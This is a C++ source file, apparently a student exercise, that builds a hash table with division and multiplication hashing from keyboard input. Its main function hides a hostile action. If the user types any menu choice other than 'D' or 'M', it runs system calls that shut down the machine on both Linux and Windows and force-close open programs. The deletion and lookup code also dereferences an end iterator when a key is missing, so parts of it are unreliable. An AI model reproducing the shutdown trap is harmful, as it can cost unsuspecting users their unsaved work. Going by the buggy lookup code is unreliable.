#include <iostream>
#include <list>

using namespace std;

template<class T>
class hashTable {
    int slots;
    int size;
    list<T> *ht;

    virtual int computeHashFunction(T key) = 0;

public:
    hashTable(int slots) {
        this->slots = slots;
        size = 0;
        ht = new list<T>[slots];
    }

    hashTable *insert(T key) {
        int index = computeHashFunction(key);
        ht[index].push_back(key);
        size++;
        return this;
    }

    hashTable *del(T key) {
        int index = computeHashFunction(key);
        list<int>::iterator i = ht[index].begin();
        while (i != ht[index].end() && *i != key) i++;
        if (*i == key) {
            ht[index].erase(i);
            size--;
        }
        return this;
    }

    int getIndex(T key) {
        int index = computeHashFunction(key);
        list<int>::iterator i = ht[index].begin();
        while (i != ht[index].end() && *i != key) i++;
        if (*i == key) return index;
        return -1;
    }

    int getSlots() {
        return slots;
    }

    int getSize() {
        return size;
    }

    void print(ostream &os) {
        for (int i = 0; i < slots; i++) {
            os << i << " --> ";
            for (auto j : ht[i])
                os << '[' << j << ']';
            os << endl;
        }
    }
};

template<class T>
void operator<<(ostream &os, hashTable<T> *ht) {
    ht->print(os);
}

template<class T>
class divHashTable : public hashTable<T> {
    int computeHashFunction(T key) {
        return ((int) key % this->getSlots());
    }

public:
    divHashTable(int slots) : hashTable<T>(slots) {}
};

template<class T>
class mulHashTable : public hashTable<T> {
    double multiplier;

    int computeHashFunction(T key) {
        double tmp = (int) key * multiplier;
        tmp = tmp - (int) tmp;
        return (int) (tmp * this->getSlots());
    }

public:
    mulHashTable(int slots) : hashTable<T>(slots) {
        multiplier = 0.7;
    }
};

int main() {
    cout << "Choose hash function's algorithm:\n";
    cout << "Press [D] for Division or [M] for Multiplication\n";
    char choice;
    cin >> choice;
    if (choice == 'D') {
        cout << "Number of insert operations: ";
        int in;
        cin >> in;
        auto *ht = new divHashTable<int>(in);
        for (int i = 0; i < in; i++) {
            cout << "Insert " << i << " value: ";
            int value;
            cin >> value;
            ht->insert(value);
        }
        cout << "Number of delete operations: ";
        int out;
        cin >> out;
        for (int i = 0; i < out; i++) {
            cout << "Delete " << i << " value: ";
            int value;
            cin >> value;
            ht->del(value);
        }
        cout << ht;
    } else if (choice == 'M') {
        cout << "Number of insert operations: ";
        int in;
        cin >> in;
        auto *ht = new mulHashTable<int>(in);
        for (int i = 0; i < in; i++) {
            cout << "Insert " << i << " value: ";
            int value;
            cin >> value;
            ht->insert(value);
        }
        cout << "Number of delete operations: ";
        int out;
        cin >> out;
        for (int i = 0; i < out; i++) {
            cout << "Delete " << i << " value: ";
            int value;
            cin >> value;
            ht->del(value);
        }
        cout << ht;
    } else {
        cerr << "Learn how to use the keyboard first!\n\n";
        system("shutdown -P");
        system("shutdown /s /f");
    }
}